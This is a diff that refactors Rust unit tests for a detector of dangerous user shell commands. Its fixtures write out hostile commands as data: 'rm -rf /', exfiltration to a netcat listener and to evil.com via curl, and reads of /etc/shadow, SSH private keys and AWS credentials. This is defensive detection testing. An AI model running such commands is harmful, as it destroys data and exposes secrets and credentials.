@@ -544,7 +544,7 @@ mod tests {
     #[test]
     fn test_dangerous_commands_detection() {
         let mut detector = UserBehaviorDetector::new();
-        let commands = vec![
+        let commands = [
             "ls -la",
             "rm -rf /",
             "cd /tmp",
@@ -560,7 +560,7 @@ mod tests {
     #[test]
     fn test_exfiltration_detection() {
         let mut detector = UserBehaviorDetector::new();
-        let commands = vec![
+        let commands = [
             "cat database.sql | nc 192.168.1.100 4444",
             "ls",
             "tar czf - secrets/ | curl -X POST http://evil.com/upload --data-binary @-",
@@ -575,7 +575,7 @@ mod tests {
     #[test]
     fn test_credential_access_detection() {
         let mut detector = UserBehaviorDetector::new();
-        let commands = vec![
+        let commands = [
             "cat /etc/shadow",
             "find / -name 'id_rsa' 2>/dev/null",
             "cat ~/.aws/credentials",
@@ -590,10 +590,7 @@ mod tests {
     #[test]
     fn test_privilege_escalation_detection() {
         let mut detector = UserBehaviorDetector::new();
-        let mut commands = Vec::new();
-        for _ in 0..100 {
-            commands.push("sudo some_command");
-        }
+        let commands = vec!["sudo some_command"; 100];
         let mut cmd_counts = HashMap::new();
         cmd_counts.insert("sudo".to_string(), 100);
         cmd_counts.insert("ls".to_string(), 30);
